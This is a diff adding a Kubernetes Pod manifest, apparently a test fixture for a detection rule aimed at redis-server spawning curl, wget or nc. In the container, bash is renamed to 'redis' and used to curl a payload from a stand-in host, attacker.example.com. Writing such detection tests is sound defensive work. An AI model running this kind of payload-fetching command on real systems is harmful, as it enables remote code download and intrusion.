@@ -1,0 +1,15 @@
+#command: redis-server spawns curl/wget/nc (CVE-2025-49844)
+#note: actor_process_name should be redis-server for full rule match
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: redis-server-launches-suspicious-tooling
+spec:
+  restartPolicy: Never
+  containers:
+  - name: redis-server-launches-suspicious-tooling
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ['sh']
+    args: ["-c", "cp /bin/bash redis; ./redis -c curl \"http://attacker.example.com/payload.sh\"; sleep infinity"]
